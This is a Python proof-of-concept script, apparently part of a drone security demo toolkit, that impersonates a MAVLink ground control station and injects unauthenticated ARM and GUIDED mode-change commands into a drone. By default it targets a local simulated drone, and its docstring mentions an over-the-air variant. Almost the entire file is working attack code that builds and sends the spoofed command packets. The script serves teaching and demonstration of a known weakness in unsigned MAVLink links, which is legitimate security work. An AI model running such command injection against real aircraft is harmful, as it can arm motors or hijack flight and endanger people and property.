#!/usr/bin/env python3
"""PoC 03 - Command Injection (Terminal 2 — attacker).

Requires the drone running in Terminal 1 (`python attacks/demos/drone.py`).
Spoofs the GCS (sysid 255) and injects ARM + a mode change. The reaction (>>> ARMED <<<)
shows up on the ASCII drone in Terminal 1; here you see the whole attack backend.
Over-the-air version: attacks/03-cmd-injection/inject_aire.py
"""
import argparse
import os
os.environ.setdefault("MAVLINK20", "1")
from pymavlink import mavutil
from pwnuav import demo
from pwnuav.tui import ClientLink, Activity, hw_check, Steps, run_dashboard
M = mavutil.mavlink


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--connect", default="udpout:127.0.0.1:14550")
    ap.add_argument("--plain", action="store_true")
    ap.add_argument("--seconds", type=float, default=None)
    a = ap.parse_args()

    link = ClientLink(a.connect); act = Activity(); hw = hw_check()
    act.log("hardware checked — link to the drone open")
    act.log("target: drone sysid=1  (MAVLink2, signing OFF)")

    def do_c2():
        act.log("[C2-01] impersonating GCS  sysid=255 compid=190")

    def do_arm():
        msg = link.mav.command_long_encode(1, 1, M.MAV_CMD_COMPONENT_ARM_DISARM, 0, 1, 0, 0, 0, 0, 0, 0)
        raw = msg.pack(link.mav); link.mav.send(msg)
        act.log("[EX-01] TX COMMAND_LONG ARM")
        act.log("        " + demo.hexdump(raw).splitlines()[0].strip())

    def chk_arm():
        act.log("[EX-01] ACK ACCEPTED -> DRONE ARMED" if link.armed() else "[EX-01] not confirmed yet")

    def do_mode():
        msg = link.mav.command_long_encode(1, 1, M.MAV_CMD_DO_SET_MODE, 0,
                                           M.MAV_MODE_FLAG_CUSTOM_MODE_ENABLED, 4, 0, 0, 0, 0, 0)
        link.mav.send(msg)
        act.log("[EX-02] TX SET_MODE -> GUIDED (custom_mode=4)")

    def chk_mode():
        hb = link.last.get("HEARTBEAT")
        act.log(f"[EX-02] mode applied: custom_mode={hb.custom_mode if hb else '?'}")

    def done():
        act.log("[+] INJECTION LANDED — unauthenticated commands accepted on the link")

    steps = Steps([(0.6, do_c2), (1.4, do_arm), (2.2, chk_arm),
                   (3.0, do_mode), (3.8, chk_mode), (4.4, done)])
    run_dashboard("PoC 03 — Command Injection", hw, link, act, steps,
                  total=a.seconds, plain=a.plain)
    link.close()


if __name__ == "__main__":
    main()
